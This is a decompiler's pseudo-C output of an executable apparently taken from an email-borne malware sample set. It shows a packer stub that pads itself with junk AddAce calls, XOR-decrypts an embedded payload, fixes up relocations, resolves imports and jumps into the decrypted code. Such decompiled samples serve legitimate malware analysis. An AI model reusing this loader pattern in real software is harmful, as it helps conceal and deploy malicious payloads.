// subject.c
// Generated on 5/4/2015 12:43:42 AM by decompiling malware_via_email/malware_0112/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	word32 esi_1057 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000026 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebp_1090 = 0x00000000
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l004012F6
l004012F3:
	esi_1057 = esi_1057 - 0x00000022
l004012F6:
	Mem1073[fp - 0x00000024:word32] = fp - 0x00000010
	Mem1075[fp - 0x00000028:word32] = 0x00000040
	Mem1077[fp - 0x0000002C:word32] = 0x00003000
	Mem1079[fp - 0x00000030:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_1082 = 0x00000000
l00401310:
	branch ebp_1090 != esi_1057 l00401319
l00401317:
	ebp_1090 = 0x00000000
l00401319:
	byte v13_1097 = Mem1079[eax_1082 + 0x00401490:byte] ^ Mem1079[ebp_1090 + 0x00404000:byte]
	Mem1098[eax_1082 + 0x00401490:byte] = v13_1097
	eax_1082 = eax_1082 + 0x00000001
	ebp_1090 = ebp_1090 + 0x00000001
	branch eax_1082 <u 0x00001420 l00401310
l00401332:
	word32 ecx_1104 = 0x00402770
	word32 dwLoc08_1114 = 0x00000000
l00401360:
	word32 eax_1124 = Mem1098[ecx_1104 + 0x00000004:word32]
	word32 edx_1129 = ecx_1104 + 0x00000008
	branch eax_1124 - 0x00000008 >>u 0x00000001 <= 0x00000000 l0040139A
l0040136F:
	word32 esi_1320 = eax_1124 - 0x00000008 >>u 0x00000001
l00401371:
	word32 eax_1323 = (word32) Mem1098[edx_1129 + 0x00000000:word16]
	branch (eax_1323 & 0x0000F000) != 0x00003000 l00401392
l00401387:
	word32 eax_1334 = (eax_1323 & 0x00000FFF) + Mem1098[ecx_1104 + 0x00000000:word32]
	Mem1337[eax_1334 + 0x00401210:word32] = Mem1098[eax_1334 + 0x00401210:word32] + 0xF0401210
l00401392:
	edx_1129 = edx_1129 + 0x00000002
	esi_1320 = esi_1320 - 0x00000001
	branch esi_1320 != 0x00000000 l00401371
l0040139A:
	word32 eax_1133 = Mem1098[ecx_1104 + 0x00000004:word32]
	word32 edx_1135 = dwLoc08_1114 + eax_1133
	word32 ecx_1136 = ecx_1104 + eax_1133
	branch edx_1135 <u 0x000000E4 l00401360
	word32 eax_1140 = Mem1098[ecx_1136 + 0x00000004:word32]
	word32 edx_1142 = edx_1135 + eax_1140
	ecx_1104 = ecx_1136 + eax_1140
	dwLoc08_1114 = edx_1142
	branch edx_1142 <u 0x000000E4 l00401360
l004013B1:
	branch Mem1098[0x00401F7C:word32] == 0x00000000 l00401458
	word32 edi_1154 = 0x00401F6C
	word32 dwLoc08_1155 = 0x00401F6C
	edi_1184 = edi_1154
	branch Mem1098[0x00401F7C:word32] == 0x00000000 l00401458
l004013C8:
	word32 edi_1184
	branch LoadLibraryA(Mem1098[edi_1184 + 0x0000000C:word32] + 0x00401210) == 0x00000000 l00401447
	word32 eax_1202 = LoadLibraryA(Mem1098[edi_1184 + 0x0000000C:word32] + 0x00401210)
	branch eax_1202 == 0x00000000 l00401447
l004013DF:
	branch Mem1098[edi_1184 + 0x00000000:word32] != 0x00000000 l004013E8
	word32 ecx_1231 = Mem1098[edi_1184 + 0x00000000:word32]
	branch ecx_1231 != 0x00000000 l004013E8
l004013E5:
	ecx_1231 = Mem1098[edi_1184 + 0x00000010:word32]
l004013E8:
	word32 ebx_1241 = Mem1098[edi_1184 + 0x00000010:word32] + 0x00401210
	word32 ebp_1242 = ecx_1231 + 0x00401210
	branch Mem1098[ebp_1242 + 0x00000000:word32] == 0x00000000 l00401443
l004013F7:
	eax_1265 = eax_1202
	goto l00401404
l00401400:
	eax_1265 = eax_1202
l00401404:
	word32 eax_1285
	word32 eax_1265
	word32 ecx_1274 = Mem1098[ebp_1242 + 0x00000000:word32]
	word16 cx_1276 = (word16) ecx_1274
	branch ecx_1274 >= 0x00000000 l0040141E
l0040140E:
	eax_1285 = GetProcAddress(eax_1265, (word32) cx_1276)
	goto l0040142E
l0040141E:
	eax_1285 = GetProcAddress(eax_1265, ecx_1274 + 0x00401212)
l0040142E:
	Mem1288[ebx_1241 + 0x00000000:word32] = eax_1285
	ebp_1242 = ebp_1242 + 0x00000004
	ebx_1241 = ebx_1241 + 0x00000004
	branch Mem1288[ebp_1242 + 0x00000000:word32] != 0x00000000 l00401400
l0040143F:
	edi_1184 = dwLoc08_1155
l00401443:
l00401447:
	edi_1184 = edi_1184 + 0x00000014
	dwLoc08_1155 = edi_1184
	branch Mem1098[edi_1184 + 0x00000010:word32] != 0x00000000 l004013C8
l00401458:
	call 0x00401C60 (retsize: 4; depth: 36)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

